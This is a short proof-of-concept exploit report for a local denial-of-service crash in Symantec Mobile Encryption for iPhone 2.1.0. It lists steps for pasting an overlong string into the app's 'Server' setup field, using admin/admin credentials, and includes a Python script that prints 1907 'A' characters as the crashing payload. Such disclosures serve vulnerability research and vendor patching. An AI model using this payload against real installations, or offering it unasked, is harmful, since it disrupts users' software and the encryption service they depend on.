# Exploit Title: Symantec Mobile Encryption for iPhone 2.1.0 - 'Server' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2018-09-02
# Vendor Homepage: https://www.symantec.com/
# Software Link: https://itunes.apple.com/mx/app/symantec-mobile-encryption/id450235714?mt=8
# Tested Version: 2.1.0
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 7 iOS 11.4.1

# Steps to Produce the Crash:
# 1.- Run python code: Symantec_Mobile_Encryption_2.1.0.py
# 2.- Copy content to clipboard
# 3.- Open App Symantec Mobile Encryption for iPhone
# 4.- User License -> Accept
# 5.- Instructions -> Setup
# 6.- Paste ClipBoard on "Server"
# 7.- User -> admin
# 8.- Password -> admin
# 9.- Next
# 10.- Network Settings -> Next
# 11.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 1907
print (buffer)